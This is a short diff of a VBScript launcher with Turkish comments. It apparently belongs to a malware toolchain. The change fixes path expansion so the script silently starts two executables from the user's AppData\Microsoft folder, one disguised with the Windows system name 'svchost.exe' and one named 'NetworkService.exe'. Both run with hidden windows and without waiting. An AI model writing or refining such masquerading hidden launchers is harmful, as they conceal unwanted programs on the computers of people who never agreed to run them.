@@ -1,2 +1,8 @@
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "%localappdata%\Microsoft\svchost.exe", 0, false
+
+' Ortam değişkenlerini VBScript'in anlayacağı gerçek yollara çeviriyoruz
+localAppData = WshShell.ExpandEnvironmentStrings("%localappdata%")
+
+' Dosyaları arka planda (0) ve beklemeden (false) çalıştır
+WshShell.Run """" & localAppData & "\Microsoft\svchost.exe""", 0, false
+WshShell.Run """" & localAppData & "\Microsoft\NetworkService.exe""", 0, false
